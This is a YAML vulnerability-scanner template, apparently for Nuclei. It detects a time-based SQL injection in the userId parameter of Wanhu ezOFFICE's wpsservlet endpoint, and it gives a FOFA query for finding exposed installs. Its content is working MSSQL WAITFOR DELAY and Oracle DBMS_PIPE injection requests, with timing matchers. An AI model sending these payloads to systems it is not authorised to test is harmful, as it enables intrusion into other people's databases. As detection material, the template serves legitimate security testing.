id: wanhu-ezoffice-userid-sqli
info:
  name: "万户ezoffice userid SQL注入漏洞"
  author: pphua,anquanscan
  severity: critical
  description: 万户ezoffice userid SQL注入
  reference:
    - none
  tags: 万户ezoffice
  metadata:
    fofa-query: app="万户网络-ezOFFICE"
    verified: true
    max-request: 4

http:
  - raw:
      - |
        @timeout: 20s
        GET /defaultroot/wpsservlet?option=getSign&userId=1;WAITFOR%20DELAY%20%270:0:5%27--&orgIdString=1&domainId=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36

      - |
        @timeout: 20s
        GET /defaultroot/wpsservlet?option=getSign&userId=1;WAITFOR%20DELAY%20%270:0:8%27--&orgIdString=1&domainId=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        name: mssql
        dsl:
          - "status_code_1 == 200 && duration_1>=5 && duration_1<=6 && contains(body_1,'[]')"
          - "status_code_2 == 200 && duration_2>=8 && duration_2<=9 && contains(body_2,'[]')"
        condition: and

  - raw:
      - |
        @timeout: 20s
        GET /defaultroot/wpsservlet?option=getSign&userId=1+AND+8579=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(97)||CHR(72)||CHR(98),5)+AND+'TZFK'='TZFK --+z&orgIdString=1&domainId=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36

      - |
        @timeout: 20s
        GET /defaultroot/wpsservlet?option=getSign&userId=1+AND+8579=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(97)||CHR(72)||CHR(98),8)+AND+'TZFK'='TZFK --+z&orgIdString=1&domainId=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        name: oracle
        dsl:
          - "status_code_1 == 200 && duration_1>=5 && duration_1<=6 && contains(body_1,'[]')"
          - "status_code_2 == 200 && duration_2>=8 && duration_2<=9 && contains(body_2,'[]')"
        condition: and
